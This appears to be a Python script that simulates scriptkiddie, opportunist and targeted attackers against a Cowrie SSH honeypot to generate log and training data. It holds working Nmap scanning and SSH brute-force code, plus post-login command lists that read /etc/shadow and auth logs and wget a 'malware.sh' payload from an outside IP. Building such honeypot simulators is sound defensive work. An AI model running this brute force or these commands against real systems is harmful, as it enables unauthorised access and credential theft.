"""
attacker/simulate.py

Automated attacker simulation against the honeypot network.

Simulates three attacker profiles:
  - scriptkiddie : Fast, noisy brute force. No finesse.
  - opportunist  : Moderate pace, tries common creds, runs basic recon commands.
  - targeted     : Slow, deliberate. Mimics a skilled human attacker.

Usage (inside container):
  python simulate.py                        # runs all profiles once
  python simulate.py --profile opportunist  # run one profile
  python simulate.py --sessions 5           # run 5 sessions
  python simulate.py --loop                 # run indefinitely (for training data)
"""

import argparse
import logging
import os
import random
import socket
import time
from pathlib import Path

import nmap
import paramiko

# ---------------------------------------------------------------------------
# Logging — structured, not print()
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    level=logging.INFO,
    datefmt="%Y-%m-%dT%H:%M:%S",
)
logger = logging.getLogger("attacker.simulate")

# ---------------------------------------------------------------------------
# Configuration — from environment variables (never hardcoded)
# ---------------------------------------------------------------------------
TARGET_HOST = os.getenv("TARGET_HOST", "172.18.0.10")
TARGET_PORT = int(os.getenv("TARGET_PORT", "2222"))
WORDLIST_PATH = Path(os.getenv("WORDLIST_PATH", "/attacker/wordlists/passwords.txt"))

USERNAMES = [
    "root", "admin", "user", "ubuntu", "debian",
    "pi", "oracle", "postgres", "deploy", "git",
    "manager", "support", "backup", "service",
]

# Commands each attacker profile runs after a successful login
PROFILE_COMMANDS = {
    "scriptkiddie": [
        "uname -a",
        "id",
        "cat /etc/passwd",
        "ls",
        "whoami",
    ],
    "opportunist": [
        "uname -a",
        "id",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "ls -la /home",
        "ps aux",
        "netstat -tulnp",
        "cat /proc/version",
        "ls /var/www",
        "wget http://203.0.113.10/malware.sh -O /tmp/m.sh",
    ],
    "targeted": [
        "uname -a",
        "id",
        "hostname",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /etc/ssh/sshd_config",
        "ls -la /home",
        "ls -la /root",
        "history",
        "cat /proc/version",
        "ifconfig",
        "netstat -tulnp",
        "ps aux | grep root",
        "crontab -l",
        "ls /var/log",
        "cat /var/log/auth.log",
        "find / -name '*.conf' 2>/dev/null | head -10",
        "find / -perm -4000 2>/dev/null | head -10",
        "wget http://203.0.113.10/payload -O /tmp/.hidden",
    ],
}

# Delay (seconds) between commands — varies by profile to mimic human behaviour
PROFILE_DELAY = {
    "scriptkiddie": (0.1, 0.5),
    "opportunist":  (0.5, 2.0),
    "targeted":     (2.0, 6.0),
}

# Max login attempts per session before giving up
PROFILE_MAX_ATTEMPTS = {
    "scriptkiddie": 20,
    "opportunist":  10,
    "targeted":     5,
}


# ---------------------------------------------------------------------------
# Phase 1: Network Scan
# ---------------------------------------------------------------------------

def scan_target(host: str, port: int) -> bool:
    """Run an Nmap scan against the target and report open ports.

    Args:
        host: Target IP address.
        port: Target port to scan.

    Returns:
        True if the target port is open, False otherwise.
    """
    logger.info("Starting Nmap scan → %s:%s", host, port)
    scanner = nmap.PortScanner()

    try:
        scanner.scan(hosts=host, ports=str(port), arguments="-sV -T4")
        state = scanner[host]["tcp"][port]["state"]
        service = scanner[host]["tcp"][port].get("name", "unknown")
        version = scanner[host]["tcp"][port].get("version", "")
        logger.info(
            "Port %s/%s is %s — service: %s %s",
            port, "tcp", state, service, version,
        )
        return state == "open"
    except Exception as exc:
        logger.warning("Nmap scan failed: %s — assuming port is open", exc)
        return True


# ---------------------------------------------------------------------------
# Phase 2: SSH Brute Force
# ---------------------------------------------------------------------------

def load_passwords(path: Path) -> list[str]:
    """Load the password wordlist from disk.

    Args:
        path: Path to the wordlist file.

    Returns:
        List of password strings.
    """
    if not path.exists():
        logger.error("Wordlist not found at %s", path)
        return ["admin", "password", "root", "123456"]

    passwords = path.read_text().strip().splitlines()
    logger.info("Loaded %d passwords from %s", len(passwords), path)
    return passwords


def brute_force_ssh(
    host: str,
    port: int,
    profile: str,
    passwords: list[str],
) -> tuple[str | None, str | None]:
    """Attempt SSH brute force against the target.

    Args:
        host: Target IP address.
        port: Target SSH port.
        profile: Attacker profile name (affects attempt count).
        passwords: List of passwords to try.

    Returns:
        Tuple of (successful_username, successful_password) or (None, None).
    """
    max_attempts = PROFILE_MAX_ATTEMPTS[profile]
    usernames_to_try = random.sample(USERNAMES, min(len(USERNAMES), 5))
    passwords_to_try = passwords[:max_attempts]

    logger.info(
        "[%s] Starting brute force — %d usernames × %d passwords",
        profile, len(usernames_to_try), len(passwords_to_try),
    )

    for username in usernames_to_try:
        for password in passwords_to_try:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5,
                    banner_timeout=10,
                    auth_timeout=5,
                    look_for_keys=False,
                    allow_agent=False,
                )
                logger.info(
                    "[%s] Login SUCCEEDED — %s:%s", profile, username, password
                )
                client.close()
                return username, password

            except paramiko.AuthenticationException:
                logger.debug(
                    "[%s] Failed — %s:%s", profile, username, password
                )
                # Vary delay between attempts based on profile
                min_d, max_d = PROFILE_DELAY[profile]
                time.sleep(random.uniform(min_d / 2, max_d / 2))

            except (socket.timeout, paramiko.SSHException, OSError) as exc:
                logger.warning("[%s] Connection error: %s", profile, exc)
                time.sleep(1)

    logger.info("[%s] Brute force exhausted — no valid credentials found", profile)
    return None, None


# ---------------------------------------------------------------------------
# Phase 3: Post-Login Exploitation
# ---------------------------------------------------------------------------

def run_post_exploitation(
    host: str,
    port: int,
    username: str,
    password: str,
    profile: str,
) -> int:
    """Log in and execute post-exploitation commands via interactive shell.

    Uses invoke_shell() instead of exec_command() because Cowrie closes
    exec_command channels immediately — interactive shell sessions are
    required for commands to register in honeypot logs.

    Args:
        host: Target IP address.
        port: Target SSH port.
        username: Successful SSH username.
        password: Successful SSH password.
        profile: Attacker profile name (affects command set and timing).

    Returns:
        Number of commands successfully executed.
    """
    commands = PROFILE_COMMANDS[profile]
    min_delay, max_delay = PROFILE_DELAY[profile]
    executed = 0

    logger.info(
        "[%s] Starting post-exploitation — %d commands queued",
        profile, len(commands),
    )

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )

        # Use interactive shell — required for Cowrie to log commands
        shell = client.invoke_shell(term="xterm", width=200, height=50)
        time.sleep(1)  # wait for shell prompt

        # Flush the initial banner/prompt
        if shell.recv_ready():
            shell.recv(4096)

        for cmd in commands:
            try:
                shell.send(cmd + "\n")
                time.sleep(random.uniform(min_delay, max_delay))

                # Read response if available
                output = ""
                if shell.recv_ready():
                    output = shell.recv(4096).decode(errors="replace")

                logger.info(
                    "[%s] CMD: %s → %d chars output", profile, cmd, len(output)
                )
                executed += 1

            except Exception as exc:
                logger.warning("[%s] Command failed (%s): %s", profile, cmd, exc)

        shell.close()
        client.close()

    except Exception as exc:
        logger.error("[%s] Post-exploitation session failed: %s", profile, exc)

    logger.info("[%s] Post-exploitation done — %d commands executed", profile, executed)
    return executed


# ---------------------------------------------------------------------------
# Full Attack Session
# ---------------------------------------------------------------------------

def run_attack_session(profile: str, passwords: list[str]) -> dict:
    """Run one complete attack session for a given profile.

    Args:
        profile: Attacker profile to simulate.
        passwords: Password wordlist.

    Returns:
        Session result dictionary with profile, success, and command count.
    """
    logger.info("=" * 60)
    logger.info("SESSION START — profile: %s → %s:%s", profile, TARGET_HOST, TARGET_PORT)
    logger.info("=" * 60)

    result = {
        "profile":       profile,
        "target":        f"{TARGET_HOST}:{TARGET_PORT}",
        "scan_success":  False,
        "login_success": False,
        "commands_run":  0,
    }

    # Phase 1 — Scan (scriptkiddie always scans; others sometimes skip)
    if profile == "scriptkiddie" or random.random() > 0.3:
        result["scan_success"] = scan_target(TARGET_HOST, TARGET_PORT)
    else:
        logger.info("[%s] Skipping scan (stealthy mode)", profile)
        result["scan_success"] = True

    if not result["scan_success"]:
        logger.warning("[%s] Target unreachable — aborting session", profile)
        return result

    # Phase 2 — Brute force
    username, password = brute_force_ssh(
        TARGET_HOST, TARGET_PORT, profile, passwords
    )

    if username and password:
        result["login_success"] = True

        # Phase 3 — Post-exploitation
        result["commands_run"] = run_post_exploitation(
            TARGET_HOST, TARGET_PORT, username, password, profile
        )

    logger.info(
        "SESSION END — profile: %s | login: %s | commands: %d",
        profile, result["login_success"], result["commands_run"],
    )
    return result


# ---------------------------------------------------------------------------
# Entry Point
# ---------------------------------------------------------------------------

def main() -> None:
    """Parse arguments and run the attacker simulation."""
    parser = argparse.ArgumentParser(
        description="Honeypot attacker simulation"
    )
    parser.add_argument(
        "--profile",
        choices=["scriptkiddie", "opportunist", "targeted", "random"],
        default="random",
        help="Attacker profile to simulate (default: random)",
    )
    parser.add_argument(
        "--sessions",
        type=int,
        default=3,
        help="Number of attack sessions to run (default: 3)",
    )
    parser.add_argument(
        "--loop",
        action="store_true",
        help="Run indefinitely (useful for generating RL training data)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=5.0,
        help="Seconds to wait between sessions (default: 5)",
    )
    args = parser.parse_args()

    passwords = load_passwords(WORDLIST_PATH)
    profiles = ["scriptkiddie", "opportunist", "targeted"]
    session_count = 0

    while True:
        for _ in range(args.sessions):
            profile = (
                random.choice(profiles)
                if args.profile == "random"
                else args.profile
            )
            run_attack_session(profile, passwords)
            session_count += 1
            logger.info("Total sessions completed: %d", session_count)
            time.sleep(args.delay)

        if not args.loop:
            break

    logger.info("Simulation complete — %d total sessions", session_count)


if __name__ == "__main__":
    main()
